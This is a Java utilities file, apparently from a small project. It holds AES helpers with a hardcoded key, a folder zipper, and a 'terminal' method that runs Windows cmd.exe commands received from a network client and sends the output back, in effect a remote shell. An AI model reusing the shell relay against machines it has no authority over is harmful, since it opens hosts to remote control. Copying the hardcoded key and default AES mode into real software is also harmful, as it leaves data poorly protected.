import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.Key;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * Created by obada on 10/13/16.
 */
/*
A static class for the utilities used in our project:(Encrypt,Decrypt,Compress)
 */
interface Utilities {


    /*
        Encrypt a byte array with AES 128 bit encryption
     */
    static byte[] encrypt(byte[] Data) throws Exception
    {
        Key key = generateKey("secret1234ewrt54");
        Cipher c = Cipher.getInstance("AES");
        c.init(Cipher.ENCRYPT_MODE, key);
        return c.doFinal(Data);
    }
    /*
    Generate a key for your AES encryption
 */
    static Key generateKey(String Key)
    {
        return new SecretKeySpec(Key.getBytes(), "AES");
    }
    /*
    Decrypt byte array
     */
    static byte[] decrypt(byte[] encryptedData) throws Exception
    {
        Key key = generateKey("secret1234ewrt54");
        Cipher c = Cipher.getInstance("AES");
        c.init(Cipher.DECRYPT_MODE, key);
        return c.doFinal(encryptedData);
    }
    /*
    return sub files/folders in a directory(Parent)
     */
    static List<String> getChildren(File dir, List<String> filesInDir) throws IOException {
        //get all the sub files/folders in dir
        File[] files = dir.listFiles();
        //if directory is not empty
        if (files != null)
        for(File file : files)
        {
            //add the absolute path of the file to our list
            if(file.isFile()) filesInDir.add(file.getAbsolutePath());
            //do a recursive call over the sub_folder
            else getChildren(file,filesInDir);
        }
        return filesInDir;
    }
    /*
    Zip a folder
     */
    static void zipDir(File dir, String zipDirName) {
        try {
            List<String> filesListInDir = getChildren(dir, new ArrayList<>());
            //now zip files one by one
            //create ZipOutputStream to write to the zip file
            FileOutputStream fos = new FileOutputStream(zipDirName);
            ZipOutputStream zos = new ZipOutputStream(fos);
            for(String filePath : filesListInDir){
                //for ZipEntry we need to keep only the name of the file, so we used substring on absolute path
                ZipEntry ze = new ZipEntry(filePath.substring(dir.getAbsolutePath().length()+1, filePath.length()));
                zos.putNextEntry(ze);
                //read the file and write to ZipOutputStream
                FileInputStream fis = new FileInputStream(filePath);
                byte[] buffer = new byte[1024*1024];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, len);
                }
                zos.closeEntry();
                fis.close();
            }
            zos.close();
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    static void terminal(String os,Client client)
    {
        //os is windows
        if(os.charAt(0) == 'W')
        {
            //open up a process
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/k");
            //write all output/error output to this file
            File tmp = new File("C:/users/"+System.getProperty("user.name")+"/tmp.txt");
            if(!tmp.exists()) try {
                tmp.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
            //redirect process output to tmp
            pb.redirectOutput(tmp);
            //redirect process output to tmp
            pb.redirectError(tmp);
            Process p = null;
            FileInputStream input=null;
            byte[] bytes;
            byte[] buffer = new byte[1024];
            int count;
            try {
                p = pb.start();
                input = new FileInputStream(tmp);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
            String str;
            try(PrintWriter pw = new PrintWriter(new OutputStreamWriter(p.getOutputStream()), true))
            {
                //read commands from user
                while(!(str=client.getRequest()).equals("close"))
                {
                    pw.println(str);
                    //wait for the process to write to tmp
                    Thread.sleep(100);
                    count = input.read(buffer);
                    bytes = Arrays.copyOfRange(buffer,0,count);
                    //write tmp to client
                    client.sendMsg(new String(bytes));
                }
            }
            catch(Exception e)
            {}
            try {
                //this will make main thread wait till process (console) will finish (will be closed)
                p.waitFor();
                //close input stream
                input.close();
                //delete the dir
                tmp.delete();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }


}
